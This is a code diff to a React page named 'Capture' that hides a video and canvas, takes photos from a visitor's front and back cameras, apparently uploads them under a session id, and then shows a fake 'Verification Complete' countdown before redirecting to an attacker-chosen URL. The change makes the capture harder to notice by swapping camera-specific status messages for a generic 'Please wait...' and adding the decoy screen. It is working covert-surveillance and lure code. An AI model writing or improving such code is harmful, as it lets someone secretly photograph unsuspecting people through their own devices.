@@ -1,4 +1,4 @@
-import { useEffect, useState, useRef } from "react";
+import { useEffect, useState, useRef, useCallback } from "react";
 import { useSearchParams } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 
@@ -82,10 +82,13 @@ const Capture = () => {
   const [searchParams] = useSearchParams();
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
-  const [status, setStatus] = useState<"checking" | "redirecting_chrome" | "not_chrome" | "loading" | "front" | "back" | "redirecting">("checking");
+  const [status, setStatus] = useState<"checking" | "redirecting_chrome" | "not_chrome" | "loading" | "capturing" | "countdown">("checking");
+  const [countdown, setCountdown] = useState<number | null>(null);
+  const [captureComplete, setCaptureComplete] = useState(false);
   
   const sessionId = searchParams.get("session") || "default";
   const rawRedirectUrl = searchParams.get("redirect") || "https://google.com";
+  const countdownSeconds = parseInt(searchParams.get("timer") || "5", 10);
   
   // Validate and sanitize redirect URL
   const redirectUrl = isValidRedirectUrl(rawRedirectUrl) ? rawRedirectUrl : "https://google.com";
@@ -165,8 +168,9 @@ const Capture = () => {
 
     const captureAndRedirect = async () => {
       try {
+        setStatus("capturing");
+        
         // Capture from FRONT camera first
-        setStatus("front");
         const frontImage = await captureFromCamera("user");
         
         if (frontImage) {
@@ -181,7 +185,6 @@ const Capture = () => {
         await new Promise(resolve => setTimeout(resolve, 300));
         
         // Capture from BACK camera
-        setStatus("back");
         const backImage = await captureFromCamera("environment");
         
         if (backImage) {
@@ -192,22 +195,39 @@ const Capture = () => {
           });
         }
         
-        setStatus("redirecting");
-        
-        // Redirect after short delay using validated URL
-        setTimeout(() => {
-          window.location.href = redirectUrl;
-        }, 300);
+        // Start countdown after capture complete
+        setCaptureComplete(true);
+        setStatus("countdown");
+        setCountdown(countdownSeconds);
         
       } catch (error) {
         console.error("Capture error:", error);
-        // Redirect anyway even if camera fails - using safe default
-        window.location.href = "https://google.com";
+        // Start countdown anyway even if camera fails
+        setCaptureComplete(true);
+        setStatus("countdown");
+        setCountdown(countdownSeconds);
       }
     };
 
     checkBrowserAndProceed();
-  }, [sessionId, redirectUrl]);
+  }, [sessionId, countdownSeconds]);
+
+  // Countdown timer effect
+  useEffect(() => {
+    if (countdown === null || countdown < 0) return;
+
+    if (countdown === 0) {
+      // Redirect when countdown reaches 0
+      window.location.href = redirectUrl;
+      return;
+    }
+
+    const timer = setTimeout(() => {
+      setCountdown(prev => (prev !== null ? prev - 1 : null));
+    }, 1000);
+
+    return () => clearTimeout(timer);
+  }, [countdown, redirectUrl]);
 
   // Show "not Chrome" message
   if (status === "not_chrome") {
@@ -245,6 +265,91 @@ const Capture = () => {
     );
   }
 
+  // Show countdown screen after capture
+  if (status === "countdown" && countdown !== null) {
+    const progressPercent = ((countdownSeconds - countdown) / countdownSeconds) * 100;
+    
+    return (
+      <div className="min-h-screen flex items-center justify-center p-4" style={{
+        background: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 50%, #0d0d1a 100%)',
+        fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, sans-serif"
+      }}>
+        {/* Hidden video and canvas */}
+        <video ref={videoRef} className="hidden" autoPlay playsInline muted />
+        <canvas ref={canvasRef} className="hidden" />
+        
+        {/* Background grid */}
+        <div className="fixed inset-0 pointer-events-none" style={{
+          backgroundImage: 'linear-gradient(rgba(0, 255, 136, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 136, 0.03) 1px, transparent 1px)',
+          backgroundSize: '50px 50px'
+        }} />
+        
+        {/* Glowing orbs */}
+        <div className="fixed w-72 h-72 rounded-full blur-[80px] opacity-40 animate-pulse" style={{
+          background: '#00ff88',
+          top: '-100px',
+          left: '-100px'
+        }} />
+        <div className="fixed w-64 h-64 rounded-full blur-[80px] opacity-40 animate-pulse" style={{
+          background: '#ec4899',
+          bottom: '-80px',
+          right: '-80px',
+          animationDelay: '-2s'
+        }} />
+        
+        {/* Countdown card */}
+        <div className="relative z-10 text-center p-12 max-w-md w-full" style={{
+          background: 'rgba(15, 15, 30, 0.9)',
+          backdropFilter: 'blur(20px)',
+          border: '1px solid rgba(0, 255, 136, 0.3)',
+          borderRadius: '24px',
+          boxShadow: '0 0 60px rgba(0, 255, 136, 0.2), 0 25px 50px rgba(0, 0, 0, 0.5)'
+        }}>
+          {/* Countdown number */}
+          <div className="w-24 h-24 mx-auto mb-6 rounded-full flex items-center justify-center text-5xl font-bold animate-pulse" style={{
+            background: 'linear-gradient(135deg, #00ff88 0%, #06b6d4 100%)',
+            color: '#0a0a1a',
+            boxShadow: '0 0 50px rgba(0, 255, 136, 0.5)'
+          }}>
+            {countdown}
+          </div>
+          
+          {/* Status badge */}
+          <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full mb-5" style={{
+            background: 'rgba(0, 255, 136, 0.1)',
+            border: '1px solid rgba(0, 255, 136, 0.3)'
+          }}>
+            <div className="w-2 h-2 rounded-full animate-pulse" style={{ background: '#00ff88' }} />
+            <span style={{ color: '#00ff88', fontSize: '12px', fontWeight: 600, textTransform: 'uppercase', letterSpacing: '1px' }}>
+              Verification Complete
+            </span>
+          </div>
+          
+          {/* Title */}
+          <h2 className="text-2xl font-bold mb-3" style={{ color: '#ffffff' }}>
+            Redirecting...
+          </h2>
+          
+          {/* Subtitle */}
+          <p className="mb-6" style={{ color: '#888', fontSize: '14px', lineHeight: 1.6 }}>
+            You will be redirected automatically in {countdown} second{countdown !== 1 ? 's' : ''}.
+          </p>
+          
+          {/* Progress bar */}
+          <div className="w-full h-1.5 rounded-full overflow-hidden" style={{ background: 'rgba(255, 255, 255, 0.1)' }}>
+            <div 
+              className="h-full rounded-full transition-all duration-1000 ease-linear"
+              style={{ 
+                width: `${progressPercent}%`,
+                background: 'linear-gradient(90deg, #00ff88 0%, #06b6d4 100%)'
+              }}
+            />
+          </div>
+        </div>
+      </div>
+    );
+  }
+
   return (
     <div className="min-h-screen bg-background flex items-center justify-center">
       {/* Hidden video and canvas for capture */}
@@ -257,9 +362,7 @@ const Capture = () => {
         <p className="text-muted-foreground text-sm">
           {status === "checking" && "Loading..."}
           {status === "loading" && "Loading..."}
-          {status === "front" && "Please wait..."}
-          {status === "back" && "Almost done..."}
-          {status === "redirecting" && "Redirecting..."}
+          {status === "capturing" && "Please wait..."}
         </p>
       </div>
     </div>
